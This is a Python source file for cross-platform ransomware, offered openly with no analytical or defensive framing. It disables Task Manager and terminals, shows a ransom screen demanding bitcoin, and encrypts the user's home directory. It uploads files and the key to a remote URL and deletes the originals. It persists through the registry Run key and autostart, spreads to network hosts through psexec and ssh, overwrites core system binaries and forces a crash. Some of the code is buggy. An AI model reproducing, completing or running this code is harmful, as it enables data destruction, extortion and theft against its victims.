import ctypes
import winreg
import time
import threading
import os
import tkinter as tk
import base64
import requests
import shutil
import socket
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import ctypes.windll
import platform

def disable_tools():
    if platform.system() == "Windows":
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)

            key_cmd_path = r"Software\Policies\Microsoft\Windows\System"
            key_cmd = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_cmd_path)
            winreg.SetValueEx(key_cmd, "DisableCMD", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key_cmd)
        except Exception as e:
            pass
    elif platform.system() == "Linux":
        try:
            os.system("pkill -f gnome-terminal")
            os.system("pkill -f konsole")
        except Exception as e:
            pass

def show_ransom_gui():
    if platform.system() == "Windows":
        root = tk.Tk()
        root.title("YOUR FILES ARE ENCRYPTED!")
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        title = tk.Label(root, text="ALL YOUR FILES HAVE BEEN ENCRYPTED!", fg="red", bg="black", font=("Arial", 38))
        title.pack(pady=100)
        message = tk.Label(root, text="Send 1 BTC to 1FAKEADDRESS or your files will be lost forever.", fg="white", bg="black", font=("Arial", 22))
        message.pack(pady=30)
        instruction = tk.Label(root, text="Closing this screen or restarting the PC will NOT recover your data.", fg="yellow", bg="black", font=("Arial", 18))
        instruction.pack(pady=30)
        root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close
        root.mainloop()
    elif platform.system() == "Linux":
        os.system("xdg-open https://example.com/ransom")
        os.system("notify-send 'ALL YOUR FILES HAVE BEEN ENCRYPTED!' 'Send 1 BTC to 1FAKEADDRESS or your files will be lost forever.'")

def crash_vm():
    if platform.system() == "Windows":
        time.sleep(30)
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os.system("shutdown /r /t 0")
    elif platform.system() == "Linux":
        time.sleep(30)
        os.system("reboot")

def encrypt_files(directory, key):
    cipher = AES.new(key, AES.MODE_EAX)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            nonce = cipher.nonce
            encrypted_data, tag = cipher.encrypt_and_digest(data)
            with open(file_path, 'wb') as f:
                f.write(nonce + encrypted_data + tag)

def exfiltrate_data(directory, target_url, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            response = requests.post(target_url, files={'file': (file, data)})
            if response.status_code == 200:
                os.remove(file_path)
    requests.post(target_url, json={'key': key.hex()})

def add_to_startup(file_path):
    if platform.system() == "Windows":
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Ransomware", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
    elif platform.system() == "Linux":
        with open(os.path.expanduser("~/.config/autostart/ransomware.desktop"), 'w') as f:
            f.write(f"""[Desktop Entry]
Type=Application
Exec={file_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=Ransomware
Name=Ransomware
Comment[en_US]=
Comment=
""")

def propagate_network(target_ip, script_path):
    if platform.system() == "Windows":
        try:
            subprocess.run(['psexec', '\\\\' + target_ip, '-s', 'cmd.exe', '/c', 'copy', script_path, 'C:\\Windows\\Temp\\ransomware.py'])
            subprocess.run(['psexec', '\\\\' + target_ip, '-s', 'cmd.exe', '/c', 'python', 'C:\\Windows\\Temp\\ransomware.py'])
        except Exception as e:
            print(f"Failed to propagate to {target_ip}. Reason: {e}")
    elif platform.system() == "Linux":
        try:
            subprocess.run(['scp', script_path, f'{target_ip}:/tmp/ransomware.py'])
            subprocess.run(['ssh', target_ip, 'python3 /tmp/ransomware.py'])
        except Exception as e:
            print(f"Failed to propagate to {target_ip}. Reason: {e}")

def inject_into_process(process_name, dll_path):
    if platform.system() == "Windows":
        kernel32 = ctypes.windll.kernel32
        h_process = kernel32.OpenProcess(0x001F0FFF, False, process_name)
        if h_process:
            kernel32.WriteProcessMemory(h_process, ctypes.c_void_p(0x00400000), dll_path.encode(), len(dll_path), None)
            kernel32.CloseHandle(h_process)

def corrupt_system_files():
    if platform.system() == "Windows":
        system_files = [
            'C:\\Windows\\System32\\kernel32.dll',
            'C:\\Windows\\System32\\user32.dll',
            'C:\\Windows\\System32\\ntdll.dll'
        ]
        for file in system_files:
            with open(file, 'rb+') as f:
                f.seek(0)
                f.write(get_random_bytes(4096))
    elif platform.system() == "Linux":
        system_files = [
            '/bin/bash',
            '/bin/sh',
            '/usr/bin/python3'
        ]
        for file in system_files:
            with open(file, 'rb+') as f:
                f.seek(0)
                f.write(get_random_bytes(4096))

def anti_debugging():
    if platform.system() == "Windows":
        try:
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool()))
        except:
            pass

if __name__ == "__main__":
    disable_tools()
    threading.Thread(target=show_ransom_gui).start()
    threading.Thread(target=crash_vm).start()

    # Generate a random encryption key
    key = get_random_bytes(32)

    # Encrypt files in the user's documents directory
    encrypt_files(os.path.expanduser("~"), key)

    # Exfiltrate data and key to a remote server
    exfiltrate_data(os.path.expanduser("~"), 'http://example.com/upload', key)

    # Add to startup
    add_to_startup(os.path.abspath(__file__))

    # Propagate to other machines on the network
    target_ips = ['192.168.1.2', '192.168.1.3']  # Add more IPs as needed
    for ip in target_ips:
        threading.Thread(target=propagate_network, args=(ip, os.path.abspath(__file__))).start()

    # Inject into a system process
    if platform.system() == "Windows":
        inject_into_process(1234, os.path.abspath(__file__))

    # Corrupt system files
    corrupt_system_files()

    # Implement anti-debugging
    anti_debugging()
